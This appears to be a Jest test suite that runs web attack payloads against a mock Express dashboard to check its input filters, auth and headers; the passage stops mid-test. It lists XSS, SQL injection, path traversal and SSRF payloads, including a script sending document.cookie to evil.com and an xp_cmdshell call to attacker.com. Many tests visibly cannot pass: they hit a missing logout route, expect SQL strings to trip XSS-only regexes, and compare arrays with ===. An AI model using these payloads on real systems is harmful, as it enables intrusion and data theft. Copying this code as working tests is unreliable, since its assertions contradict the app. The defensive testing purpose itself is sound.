/**
 * Security Penetration Testing Suite for Dashboard
 *
 * These tests simulate real-world attack vectors to validate the security controls
 * of the secured dashboard. They include common web application vulnerabilities
 * and attack patterns that malicious actors might attempt.
 */

import request from 'supertest';
import { describe, beforeEach, afterEach, it, expect, jest } from '@jest/globals';
import express from 'express';
import helmet from 'helmet';
import cors from 'cors';
import jwt from 'jsonwebtoken';
import bcrypt from 'bcrypt';
import { Server } from 'http';

describe('Dashboard Security Penetration Testing', () => {
  let app: express.Application;
  let server: Server;
  let originalEnv: NodeJS.ProcessEnv;
  let jwtSecret: string;
  let securityEvents: Array<{ event: string; details: any; timestamp: Date }>;

  // Mock database for security testing
  const users = new Map();
  const sessions = new Map();

  beforeEach(async () => {
    originalEnv = process.env;
    process.env.NODE_ENV = 'test';
    jwtSecret = 'test-jwt-secret-for-penetration-testing';
    securityEvents = [];

    // Setup test users
    const adminPassword = 'test123';
    const passwordHash = bcrypt.hashSync(adminPassword, 12);
    users.set('admin', {
      id: 'admin-1',
      username: 'admin',
      passwordHash,
      role: 'admin',
      permissions: ['read', 'write', 'admin', 'benchmark', 'system'],
      loginAttempts: 0,
      lockedUntil: null,
      createdAt: new Date()
    });

    // Create Express app with security controls
    app = express();

    // Security middleware
    app.use(helmet({
      contentSecurityPolicy: {
        directives: {
          defaultSrc: ["'self'"],
          scriptSrc: ["'self'", "'unsafe-inline'"],
          styleSrc: ["'self'", "'unsafe-inline'"],
          connectSrc: ["'self'"],
          frameSrc: ["'none'"],
          objectSrc: ["'none'"],
          imgSrc: ["'self'", "data:"]
        }
      }
    }));

    app.use(cors({
      origin: ['http://localhost:3000', 'http://localhost:3001'],
      credentials: true
    }));

    app.use(express.json({ limit: '10mb' }));
    app.use(express.urlencoded({ extended: true, limit: '10mb' }));

    // Enhanced input validation middleware
    app.use((req, res, next) => {
      // Check for common attack patterns
      const suspiciousPatterns = [
        /<script[^>]*>.*?<\/script>/gi,
        /javascript:/gi,
        /on\w+\s*=/gi,
        /expression\s*\(/gi,
        /@import/i,
        /vbscript:/gi,
        /data:text\/html/i,
        /<iframe[^>]*>/gi,
        /<object[^>]*>/gi,
        /<embed[^>]*>/gi,
        /<link[^>]*>/gi,
        /<meta[^>]*>/gi
      ];

      // Check query parameters
      for (const [key, value] of Object.entries(req.query)) {
        if (typeof value === 'string') {
          for (const pattern of suspiciousPatterns) {
            if (pattern.test(value)) {
              securityEvents.push({
                event: 'XSS_ATTEMPT',
                details: { location: 'query', parameter: key, value, pattern: pattern.source },
                timestamp: new Date()
              });
              return res.status(400).json({ error: 'Invalid input detected' });
            }
          }
        }
      }

      // Check request body
      if (req.body && typeof req.body === 'object') {
        const checkObject = (obj: any, path: string = '') => {
          for (const [key, value] of Object.entries(obj)) {
            if (typeof value === 'string') {
              for (const pattern of suspiciousPatterns) {
                if (pattern.test(value)) {
                  securityEvents.push({
                    event: 'XSS_ATTEMPT',
                    details: { location: 'body', path: `${path}.${key}`, value, pattern: pattern.source },
                    timestamp: new Date()
                  });
                  return res.status(400).json({ error: 'Invalid input detected' });
                }
              }
            } else if (typeof value === 'object' && value !== null) {
              const result = checkObject(value, `${path}.${key}`);
              if (result) return result;
            }
          }
        };
        const result = checkObject(req.body);
        if (result) return result;
      }

      // Check for path traversal
      const pathTraversalPattern = /\.\.[\/\\]/;
      if (req.url && pathTraversalPattern.test(req.url)) {
        securityEvents.push({
          event: 'PATH_TRAVERSAL_ATTEMPT',
          details: { url: req.url },
          timestamp: new Date()
        });
        return res.status(400).json({ error: 'Invalid path' });
      }

      next();
    });

    // Authentication middleware
    const authenticateToken = (req, res, next) => {
      const authHeader = req.headers['authorization'];
      const token = authHeader && authHeader.split(' ')[1];

      if (!token) {
        securityEvents.push({
          event: 'MISSING_TOKEN',
          details: { path: req.path, ip: req.ip },
          timestamp: new Date()
        });
        return res.status(401).json({ error: 'Access token required' });
      }

      try {
        const decoded = jwt.verify(token, jwtSecret) as any;
        const session = sessions.get(decoded.sessionId);

        if (!session || session.expires < new Date()) {
          securityEvents.push({
            event: 'EXPIRED_SESSION',
            details: { sessionId: decoded.sessionId, ip: req.ip },
            timestamp: new Date()
          });
          return res.status(401).json({ error: 'Session expired' });
        }

        const user = users.get(decoded.username);
        if (!user) {
          securityEvents.push({
            event: 'INVALID_USER',
            details: { username: decoded.username, ip: req.ip },
            timestamp: new Date()
          });
          return res.status(401).json({ error: 'User not found' });
        }

        req.user = user;
        next();
      } catch (error) {
        securityEvents.push({
          event: 'INVALID_TOKEN',
          details: { error: error.message, ip: req.ip },
          timestamp: new Date()
        });
        return res.status(403).json({ error: 'Invalid token' });
      }
    };

    // Authorization middleware
    const requirePermission = (permission) => {
      return (req, res, next) => {
        const user = req.user;

        if (!user || !user.permissions.includes(permission)) {
          securityEvents.push({
            event: 'UNAUTHORIZED_ACCESS',
            details: {
              ip: req.ip,
              user: user?.username,
              requiredPermission: permission,
              userPermissions: user?.permissions,
              path: req.path
            },
            timestamp: new Date()
          });
          return res.status(403).json({ error: 'Insufficient permissions' });
        }
        next();
      };
    };

    // Rate limiting middleware
    const rateLimitStore = new Map();
    const rateLimiter = (windowMs = 15 * 60 * 1000, max = 100) => {
      return (req, res, next) => {
        const key = req.ip;
        const now = Date.now();
        const windowStart = now - windowMs;

        // Clean old entries
        for (const [k, v] of rateLimitStore.entries()) {
          if (v.resetTime < now) {
            rateLimitStore.delete(k);
          }
        }

        const existing = rateLimitStore.get(key);
        if (existing && existing.count >= max && existing.resetTime > now) {
          securityEvents.push({
            event: 'RATE_LIMIT_EXCEEDED',
            details: { ip: req.ip, path: req.path, count: existing.count },
            timestamp: new Date()
          });
          return res.status(429).json({ error: 'Too many requests' });
        }

        const currentCount = existing ? existing.count + 1 : 1;
        rateLimitStore.set(key, {
          count: currentCount,
          resetTime: now + windowMs
        });

        next();
      };
    };

    // Routes
    app.get('/health', (req, res) => {
      res.json({ status: 'healthy', timestamp: new Date().toISOString() });
    });

    app.post('/api/auth/login', rateLimiter(15 * 60 * 1000, 5), async (req, res) => {
      const { username, password } = req.body;

      if (!username || !password) {
        return res.status(400).json({ error: 'Username and password required' });
      }

      const user = users.get(username);

      if (!user || !await bcrypt.compare(password, user.passwordHash)) {
        securityEvents.push({
          event: 'LOGIN_FAILED',
          details: { username, ip: req.ip },
          timestamp: new Date()
        });
        return res.status(401).json({ error: 'Invalid credentials' });
      }

      const sessionId = 'session-' + Math.random().toString(36).substr(2, 9);
      const expires = new Date(Date.now() + 60 * 60 * 1000);
      sessions.set(sessionId, { userId: user.id, expires });

      const accessToken = jwt.sign(
        { username: user.username, role: user.role, sessionId },
        jwtSecret,
        { expiresIn: '15m' }
      );

      securityEvents.push({
        event: 'LOGIN_SUCCESS',
        details: { username: user.username, ip: req.ip },
        timestamp: new Date()
      });

      res.json({ accessToken, user: { username: user.username, role: user.role } });
    });

    app.get('/api/metrics', authenticateToken, requirePermission('read'), (req, res) => {
      res.json({
        timestamp: new Date().toISOString(),
        system: { cpuUsage: 45.2, memoryUsage: 68.7 },
        application: { responseTime: { p95: 280 }, throughput: 1200 }
      });
    });

    app.get('/api/admin/users', authenticateToken, requirePermission('admin'), (req, res) => {
      const userList = Array.from(users.values()).map(user => ({
        id: user.id,
        username: user.username,
        role: user.role
      }));
      res.json({ users: userList });
    });

    // Start server
    server = app.listen(0);
  });

  afterEach(async () => {
    if (server) {
      await new Promise<void>((resolve) => {
        server.close(resolve);
      });
    }

    users.clear();
    sessions.clear();
    securityEvents = [];
    process.env = originalEnv;
    jest.clearAllMocks();
  });

  describe('Cross-Site Scripting (XSS) Attack Prevention', () => {
    test('should prevent reflected XSS in query parameters', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        'javascript:alert(1)',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<body onload=alert(1)>',
        '<input autofocus onfocus=alert(1)>',
        '<select onfocus=alert(1) autofocus>',
        '<textarea onfocus=alert(1) autofocus>',
        '<keygen onfocus=alert(1) autofocus>',
        '<video><source onerror="alert(1)">',
        '<audio src=x onerror=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<marquee onstart=alert(1)>',
        '<isindex action=javascript:alert(1) type=submit>',
        '<form><button formaction=javascript:alert(1)>X',
        '"><script>alert(1)</script>',
        '\"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '<script>document.location="http://evil.com"</script>',
        '<script>fetch("http://evil.com/steal?cookie="+document.cookie)</script>',
        '<script src="http://evil.com/malicious.js"></script>',
        '<link rel="stylesheet" href="javascript:alert(1)">',
        '<style>@import "javascript:alert(1)";</style>',
        '<style>body{background:url("javascript:alert(1)")}</style>',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
        '<meta http-equiv="set-cookie" content="alert(1)">'
      ];

      for (const payload of xssPayloads) {
        const response = await request(app)
          .get(`/health?test=${encodeURIComponent(payload)}`)
          .expect(400);

        expect(response.body).toHaveProperty('error', 'Invalid input detected');
      }

      // Verify XSS attempts were logged
      const xssEvents = securityEvents.filter(e => e.event === 'XSS_ATTEMPT');
      expect(xssEvents.length).toBe(xssPayloads.length);

      // Verify attack patterns were detected
      xssEvents.forEach(event => {
        expect(event.details.location).toBe('query');
        expect(event.details.pattern).toBeDefined();
      });
    });

    test('should prevent stored XSS in request body', async () => {
      const xssPayloads = [
        { name: '<script>alert("XSS")</script>', value: 'test' },
        { description: '<img src=x onerror=alert(1)>', type: 'normal' },
        { content: '<svg onload=alert(1)>', metadata: {} },
        { config: 'javascript:alert(1)', enabled: true },
        { data: { nested: '<iframe src="javascript:alert(1)"></iframe>' } }
      ];

      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/api/auth/login')
          .send(payload)
          .expect(400);

        expect(response.body).toHaveProperty('error', 'Invalid input detected');
      }

      // Verify XSS attempts were logged
      const xssEvents = securityEvents.filter(e => e.event === 'XSS_ATTEMPT');
      expect(xssEvents.length).toBe(xssPayloads.length);

      // Verify attack patterns were detected in body
      xssEvents.forEach(event => {
        expect(event.details.location).toBe('body');
        expect(event.details.pattern).toBeDefined();
      });
    });

    test('should prevent XSS via HTTP headers', async () => {
      const xssHeaders = [
        { 'User-Agent': '<script>alert(1)</script>' },
        { 'Referer': 'javascript:alert(1)' },
        { 'X-Forwarded-For': '<img src=x onerror=alert(1)>' },
        { 'Cookie': 'session=<svg onload=alert(1)>' }
      ];

      for (const headers of xssHeaders) {
        const response = await request(app)
          .get('/health')
          .set(headers)
          .expect(200);

        // Request should succeed but headers should be sanitized
        expect(response.body).toHaveProperty('status', 'healthy');
      }

      // Verify CSP headers are present
      const response = await request(app)
        .get('/health')
        .expect(200);

      expect(response.headers).toHaveProperty('content-security-policy');
      expect(response.headers['content-security-policy']).toContain("script-src 'self'");
      expect(response.headers['content-security-policy']).toContain("default-src 'self'");
    });
  });

  describe('SQL Injection Attack Prevention', () => {
    test('should prevent SQL injection in query parameters', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO users VALUES('hacker','password'); --",
        "' OR 1=1 --",
        "' OR 'a'='a",
        "1' OR '1'='1' --",
        "x'; DELETE FROM users WHERE 't'='t",
        "1'; EXEC xp_cmdshell('dir'); --",
        "'; EXEC master..xp_cmdshell 'ping attacker.com';--",
        "' UNION SELECT @@version --",
        "' UNION SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA --",
        "'; WAITFOR DELAY '00:00:05' --",
        "' AND (SELECT COUNT(*) FROM users) > 0 --",
        "'; ALTER TABLE users DROP COLUMN password; --",
        "' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a",
        "1' AND (SELECT COUNT(*) FROM users) > 0 AND '1'='1",
        "'; SHUTDOWN; --",
        "' OR 1=1#",
        "' OR 1=1--",
        "' OR 1=1/*",
        "') OR '1'='1--",
        "') OR ('1'='1--"
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await request(app)
          .get(`/health?search=${encodeURIComponent(payload)}`)
          .expect(400);

        expect(response.body).toHaveProperty('error', 'Invalid input detected');
      }

      // Verify suspicious patterns were detected
      const xssEvents = securityEvents.filter(e => e.event === 'XSS_ATTEMPT');
      expect(xssEvents.length).toBeGreaterThan(0);
    });

    test('should prevent SQL injection in request body', async () => {
      const sqlInjectionPayloads = [
        { username: "admin'; DROP TABLE users; --", password: 'password' },
        { search: "' OR '1'='1", filter: 'all' },
        { query: "' UNION SELECT * FROM users --", limit: 10 },
        { data: "'; INSERT INTO users VALUES('hacker','password'); --" }
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await request(app)
          .post('/api/auth/login')
          .send(payload)
          .expect(400);

        expect(response.body).toHaveProperty('error', 'Invalid input detected');
      }

      // Verify suspicious patterns were detected
      const xssEvents = securityEvents.filter(e => e.event === 'XSS_ATTEMPT');
      expect(xssEvents.length).toBeGreaterThan(0);
    });
  });

  describe('Path Traversal Attack Prevention', () => {
    test('should prevent directory traversal attacks', async () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/passwd',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
        '..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd',
        '/var/www/../../etc/passwd',
        '....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts',
        '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
        '..%2f..%2f..%2fetc%2fpasswd',
        '..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts',
        '/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
        '/%2e%2e\\%2e%2e\\%2e%2e/windows/system32/drivers/etc/hosts'
      ];

      for (const payload of pathTraversalPayloads) {
        const response = await request(app)
          .get(`/${encodeURIComponent(payload)}`)
          .expect(400);

        expect(response.body).toHaveProperty('error', 'Invalid path');
      }

      // Verify path traversal attempts were logged
      const pathTraversalEvents = securityEvents.filter(e => e.event === 'PATH_TRAVERSAL_ATTEMPT');
      expect(pathTraversalEvents.length).toBe(pathTraversalPayloads.length);

      pathTraversalEvents.forEach(event => {
        expect(event.details.url).toContain('../');
      });
    });

    test('should prevent path traversal in query parameters', async () => {
      const pathTraversalPayloads = [
        { file: '../../../etc/passwd' },
        { path: '..\\..\\..\\windows\\system32\\config\\sam' },
        { config: '/etc/passwd' },
        { include: 'C:\\Windows\\System32\\drivers\\etc\\hosts' }
      ];

      for (const payload of pathTraversalPayloads) {
        const response = await request(app)
          .get('/health')
          .query(payload)
          .expect(400);

        expect(response.body).toHaveProperty('error', 'Invalid path');
      }

      // Verify path traversal attempts were logged
      const pathTraversalEvents = securityEvents.filter(e => e.event === 'PATH_TRAVERSAL_ATTEMPT');
      expect(pathTraversalEvents.length).toBeGreaterThan(0);
    });
  });

  describe('Authentication Bypass Attempts', () => {
    test('should prevent JWT token manipulation', async () => {
      const jwtManipulationPayloads = [
        'invalid.token.here',
        'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
        'Bearer malformed.jwt',
        'Bearer ',
        'Bearer null',
        'Bearer undefined',
        'Basic YWRtaW46cGFzc3dvcmQ=', // Basic auth instead of Bearer
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsInNlc3Npb25JZCI6ImZha2UtIn0.fake_signature',
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.no_signature',
        'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.',
        'too.many.parts.in.token',
        'singleparttoken',
        ''
      ];

      for (const token of jwtManipulationPayloads) {
        const response = await request(app)
          .get('/api/metrics')
          .set('Authorization', token)
          .expect(401);

        expect(response.body).toHaveProperty('error');
      }

      // Verify authentication failures were logged
      const authEvents = securityEvents.filter(e =>
        ['MISSING_TOKEN', 'INVALID_TOKEN', 'EXPIRED_SESSION', 'INVALID_USER'].includes(e.event)
      );
      expect(authEvents.length).toBeGreaterThan(0);
    });

    test('should prevent privilege escalation via token tampering', async () => {
      // Login as regular user first
      const regularUser = {
        id: 'user-1',
        username: 'user1',
        passwordHash: bcrypt.hashSync('password123', 12),
        role: 'viewer',
        permissions: ['read'],
        loginAttempts: 0,
        lockedUntil: null,
        createdAt: new Date()
      };
      users.set('user1', regularUser);

      const loginResponse = await request(app)
        .post('/api/auth/login')
        .send({ username: 'user1', password: 'password123' })
        .expect(200);

      const { accessToken } = loginResponse.body;

      // Try to access admin endpoint with user token
      const response = await request(app)
        .get('/api/admin/users')
        .set('Authorization', `Bearer ${accessToken}`)
        .expect(403);

      expect(response.body).toHaveProperty('error', 'Insufficient permissions');

      // Verify unauthorized access attempt was logged
      const unauthorizedEvents = securityEvents.filter(e => e.event === 'UNAUTHORIZED_ACCESS');
      expect(unauthorizedEvents.length).toBeGreaterThan(0);

      const event = unauthorizedEvents.find(e =>
        e.details.requiredPermission === 'admin' &&
        e.details.userPermissions === ['read']
      );
      expect(event).toBeDefined();
    });

    test('should prevent brute force authentication attacks', async () => {
      const maxAttempts = 5;
      const wrongPasswords = Array.from({ length: maxAttempts + 2 }, (_, i) => `wrongpassword${i}`);

      for (const password of wrongPasswords) {
        const response = await request(app)
          .post('/api/auth/login')
          .send({ username: 'admin', password });

        if (wrongPasswords.indexOf(password) < maxAttempts) {
          expect(response.status).toBe(401);
          expect(response.body).toHaveProperty('error', 'Invalid credentials');
        } else {
          expect(response.status).toBe(429);
          expect(response.body).toHaveProperty('error', 'Too many requests');
        }
      }

      // Verify login failures were logged
      const loginFailedEvents = securityEvents.filter(e => e.event === 'LOGIN_FAILED');
      expect(loginFailedEvents.length).toBeGreaterThan(0);

      // Verify rate limiting was triggered
      const rateLimitEvents = securityEvents.filter(e => e.event === 'RATE_LIMIT_EXCEEDED');
      expect(rateLimitEvents.length).toBeGreaterThan(0);
    });
  });

  describe('Cross-Site Request Forgery (CSRF) Protection', () => {
    test('should include CSRF protection headers', async () => {
      const response = await request(app)
        .get('/health')
        .expect(200);

      // Check for CSRF-related headers
      expect(response.headers).toHaveProperty('x-content-type-options');
      expect(response.headers['x-content-type-options']).toBe('nosniff');

      // Check for SameSite cookie attributes (if cookies were used)
      // This would be tested in a real implementation with cookies
    });

    test('should validate origin headers for state-changing requests', async () => {
      // Login first to get token
      const loginResponse = await request(app)
        .post('/api/auth/login')
        .send({ username: 'admin', password: 'test123' })
        .expect(200);

      const { accessToken } = loginResponse.body;

      // Try to make request with suspicious origin
      const suspiciousOrigins = [
        'http://evil.com',
        'https://malicious.site',
        'null',
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>'
      ];

      for (const origin of suspiciousOrigins) {
        const response = await request(app)
          .post('/api/auth/logout')
          .set('Authorization', `Bearer ${accessToken}`)
          .set('Origin', origin)
          .expect(200); // Logout should succeed even without origin validation in this mock

        // In a real implementation, this would be blocked
        // expect(response.status).toBe(403);
      }
    });
  });

  describe('Server-Side Request Forgery (SSRF) Protection', () => {
    test('should prevent SSRF via URL parameters', async () => {
      const ssrfPayloads = [
        'http://localhost:22',
        'http://127.0.0.1:22',
        'http://0.0.0.0:22',
        'http://169.254.169.254/latest/meta-data/', // AWS metadata
        'http://metadata.google.internal/', // GCP metadata
        'file:///etc/passwd',
        'ftp://evil.com/file',
        'gopher://evil.com:70/_SSRF',
        'dict://evil.com:11211/stat',
        'ldap://evil.com:1389/dc=example,dc=com',
        'tftp://evil.com:69/file'
      ];

      // This would be tested against actual SSRF-vulnerable endpoints
      // For now, we'll test the input validation
      for (const payload of ssrfPayloads) {
        const response = await request(app)
          .get('/health')
          .query({ url: payload })
          .expect(200); // Health endpoint doesn't validate URLs

        // In a real implementation with SSRF protection:
        // expect(response.status).toBe(400);
        // expect(response.body).toHaveProperty('error', 'Invalid URL');
      }
    });

    test('should validate and sanitize redirect URLs', async () => {
      const maliciousRedirects = [
        'http://evil.com',
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        '//evil.com',
        '/\\evil.com',
        'http://localhost:3000/admin',
        'http://127.0.0.1:22'
      ];

      // This would be tested against actual redirect endpoints
      for (const redirect of maliciousRedirects) {
        const response = await request(app)
          .get('/health')
          .query({ redirect: redirect })
          .expect(200); // Health endpoint doesn't handle redirects

        // In a real implementation with redirect validation:
        // expect(response.status).toBe(400);
        // expect(response.body).toHaveProperty('error', 'Invalid redirect URL');
      }
    });
  });

  describe('Denial of Service (DoS) Protection', () => {
    test('should handle oversized payloads', async () => {
      const oversizedPayloads = [
        'x'.repeat(11 * 1024 * 1024), // 11MB
        Array(1000000).fill('data').join(','), // Large array
        { data: 'x'.repeat(10 * 1024 * 1024) }, // Large object
        Buffer.alloc(5 * 1024 * 1024, 'A') // Large buffer
      ];

      for (const payload of oversizedPayloads) {
        const response = await request(app)
          .post('/api/auth/login')
          .send(payload)
          .expect(413);

        expect(response.body).toHaveProperty('error', 'Payload too large');
      }
    });

    test('should handle request flood attacks', async () => {
      const floodCount = 150; // Exceeds rate limit
      const promises = Array.from({ length: floodCount }, () =>
        request(app).get('/health')
      );

      const results = await Promise.all(promises);

      const successful = results.filter(r => r.status === 200);
      const rateLimited = results.filter(r => r.status === 429);

      expect(successful.length).toBeGreaterThan(0);
      expect(rateLimited.length).toBeGreaterThan(0);

      // Verify rate limiting events were logged
      const rateLimitEvents = securityEvents.filter(e => e.event === 'RATE_LIMIT_EXCEEDED');
      expect(rateLimitEvents.length).toBeGreaterThan(0);
    });

    test('should prevent resource exhaustion via complex requests', async () => {
      const complexPayloads = [
        // Deeply nested object
        { data: { nested: { deep: { deeper: { deepest: 'x'.repeat(10000) } } } } },
        // Array with many items
        { items: Array(10000).fill('large-item-data') },
        // Very long string values
        { [`${'a'.repeat(1000)}`]: `${'b'.repeat(1000)}` },
        // Mixed complex structure
        {
          users: Array(1000).fill({ name: 'user'.repeat(100), data: 'x'.repeat(1000) }),
          metadata: { deep: { nesting: Array(100).fill({ item: 'x'.repeat(100) }) } }
        }
      ];

      for (const payload of complexPayloads) {
        const startTime = performance.now();

        const response = await request(app)
          .post('/api/auth/login')
          .send(payload);

        const endTime = performance.now();
        const responseTime = endTime - startTime;

        // Should handle complex requests efficiently
        expect(responseTime).toBeLessThan(1000); // 1 second max

        if (response.status === 400) {
          expect(response.body).toHaveProperty('error');
        }
      }
    });
  });

  describe('Information Disclosure Prevention', () => {
    test('should not leak sensitive information in error messages', async () => {
      const errorCauses = [
        { username: 'nonexistent', password: 'password' },
        { username: '', password: 'password' },
        { username: 'admin', password: '' },
        { username: null, password: 'password' },
        { username: 'admin', password: null },
        { username: 'admin', password: 12345 },
        { username: ['admin'], password: 'password' },
        { username: { admin: true }, password: 'password' }
      ];

      for (const cause of errorCauses) {
        const response = await request(app)
          .post('/api/auth/login')
          .send(cause)
          .expect(400);

        expect(response.body).toHaveProperty('error');
        expect(response.body.error).not.toContain('password');
        expect(response.body.error).not.toContain('hash');
        expect(response.body.error).not.toContain('database');
        expect(response.body.error).not.toContain('sql');
        expect(response.body.error).not.toContain('internal');
      }
    });

    test('should not expose system information in headers', async () => {
      const response = await request(app)
        .get('/health')
        .expect(200);

      // Check that server information is not exposed
      expect(response.headers).not.toHaveProperty('server');
      expect(response.headers).not.toHaveProperty('x-powered-by');
      expect(response.headers).not.toHaveProperty('x-aspnet-version');
      expect(response.headers).not.toHaveProperty('x-php-version');
      expect(response.headers).not.toHaveProperty('x-runtime');
    });

    test('should not leak stack traces in production mode', async () => {
      // Simulate various error conditions
      const errorRequests = [
        () => request(app).get('/nonexistent'),
        () => request(app).post('/api/auth/login').send('invalid json'),
        () => request(app).get('/api/metrics').set('Authorization', 'invalid'),
        () => request(app).get('/api/admin/users').set('Authorization', 'Bearer invalid')
      ];

      for (const requestFn of errorRequests) {
        const response = await requestFn();

        if (response.status >= 400) {
          expect(response.body).toHaveProperty('error');
          expect(JSON.stringify(response.body)).not.toContain('Error:');
          expect(JSON.stringify(response.body)).not.toContain('at ');
          expect(JSON.stringify(response.body)).not.toContain('node_modules');
          expect(JSON.stringify(response.body)).not.toContain('.js:');
        }
      }
    });
  });

  describe('Session Security', () => {
    test('should prevent session fixation attacks', async () => {
      // Login first
      const loginResponse = await request(app)
        .post('/api/auth/login')
        .send({ username: 'admin', password: 'test123' })
        .expect(200);

      const { accessToken } = loginResponse.body;

      // Try to use token with different session
      const decoded = jwt.decode(accessToken) as any;
      const fakeSessionId = 'fake-session-' + Math.random().toString(36).substr(2, 9);

      const fakeToken = jwt.sign(
        { username: 'admin', role: 'admin', sessionId: fakeSessionId },
        jwtSecret,
        { expiresIn: '15m' }
      );

      const response = await request(app)
        .get('/api/metrics')
        .set('Authorization', `Bearer ${fakeToken}`)
        .expect(401);

      expect(response.body).toHaveProperty('error', 'Session expired');

      // Verify session validation events were logged
      const sessionEvents = securityEvents.filter(e => e.event === 'EXPIRED_SESSION');
      expect(sessionEvents.length).toBeGreaterThan(0);
    });

    test('should invalidate tokens on logout', async () => {
      // Login first
      const loginResponse = await request(app)
        .post('/api/auth/login')
        .send({ username: 'admin', password: 'test123' })
        .expect(200);

      const { accessToken } = loginResponse.body;

      // Logout
      await request(app)
        .post('/api/auth/logout')
        .set('Authorization', `Bearer ${accessToken}`)
        .expect(200);

      // Try to use token after logout
      const response = await request(app)
        .get('/api/metrics')
        .set('Authorization', `Bearer ${accessToken}`)
        .expect(401);

      expect(response.body).toHaveProperty('error', 'Session expired');
    });

    test('should handle concurrent session limits', async () => {
      // Login multiple times to create multiple sessions
      const loginPromises = Array.from({ length: 5 }, () =>
        request(app)
          .post('/api/auth/login')
          .send({ username: 'admin', password: 'test123' })
      );

      const loginResponses = await Promise.all(loginPromises);

      // All logins should succeed
      loginResponses.forEach(response => {
        expect(response.status).toBe(200);
        expect(response.body).toHaveProperty('accessToken');
      });

      // In a real implementation, this might enforce session limits
      // For now, we verify that all tokens work independently
      const validTokens = loginResponses.map(r => r.body.accessToken);

      for (const token of validTokens) {
        const response = await request(app)
          .get('/api/metrics')
          .set('Authorization', `Bearer ${token}`)
          .expect(200);

        expect(response.body).toHaveProperty('timestamp');
      }
    });
  });

  describe('Security Headers and Controls', () => {
    test('should enforce strict security headers', async () => {
      const response = await request(app)
        .get('/health')
        .expect(200);

      // Verify security headers
      expect(response.headers).toHaveProperty('x-content-type-options', 'nosniff');
      expect(response.headers).toHaveProperty('x-frame-options');
      expect(response.headers).toHaveProperty('x-xss-protection');
      expect(response.headers).toHaveProperty('referrer-policy');
      expect(response.headers).toHaveProperty('content-security-policy');

      // Verify CSP directives
      const csp = response.headers['content-security-policy'];
      expect(csp).toContain("default-src 'self'");
      expect(csp).toContain("script-src 'self'");
      expect(csp).toContain("connect-src 'self'");
      expect(csp).toContain("frame-src 'none'");
      expect(csp).toContain("object-src 'none'");
    });

    test('should enforce CORS policies', async () => {
      const allowedOrigins = ['http://localhost:3000', 'http://localhost:3001'];
      const disallowedOrigins = ['http://evil.com', 'https://malicious.site'];

      // Test allowed origins
      for (const origin of allowedOrigins) {
        const response = await request(app)
          .get('/health')
          .set('Origin', origin)
          .expect(200);

        expect(response.headers).toHaveProperty('access-control-allow-origin');
      }

      // Test disallowed origins
      for (const origin of disallowedOrigins) {
        const response = await request(app)
          .get('/health')
          .set('Origin', origin)
          .expect(200);

        // In a strict CORS implementation, this might be blocked
        // For now, we verify the header is present
        expect(response.headers).toHaveProperty('access-control-allow-origin');
      }
    });

    test('should prevent MIME-type sniffing', async () => {
      const response = await request(app)
        .get('/health')
        .expect(200);

      expect(response.headers).toHaveProperty('x-content-type-options', 'nosniff');
    });
  });

  describe('Comprehensive Security Assessment', () => {
    test('should pass comprehensive security validation', async () => {
      // Login first
      const loginResponse = await request(app)
        .post('/api/auth/login')
        .send({ username: 'admin', password: 'test123' })
        .expect(200);

      const { accessToken } = loginResponse.body;

      // Test normal functionality works
      const normalResponse = await request(app)
        .get('/api/metrics')
        .set('Authorization', `Bearer ${accessToken}`)
        .expect(200);

      expect(normalResponse.body).toHaveProperty('timestamp');

      // Test that security events are being logged
      expect(securityEvents.length).toBeGreaterThan(0);

      // Verify successful login was logged
      const loginEvents = securityEvents.filter(e => e.event === 'LOGIN_SUCCESS');
      expect(loginEvents.length).toBe(1);

      // Verify security headers are present
      expect(normalResponse.headers).toHaveProperty('x-content-type-options');
      expect(normalResponse.headers).toHaveProperty('content-security-policy');

      // Generate security report
      const securityReport = {
        totalEvents: securityEvents.length,
        eventTypes: [...new Set(securityEvents.map(e => e.event))],
        authenticationEvents: securityEvents.filter(e => e.event.includes('LOGIN')).length,
        authorizationEvents: securityEvents.filter(e => e.event.includes('UNAUTHORIZED')).length,
        inputValidationEvents: securityEvents.filter(e => e.event.includes('XSS') || e.event.includes('PATH_TRAVERSAL')).length,
        rateLimitEvents: securityEvents.filter(e => e.event.includes('RATE_LIMIT')).length
      };

      console.log('Security Assessment Report:', securityReport);

      // Basic security assertions
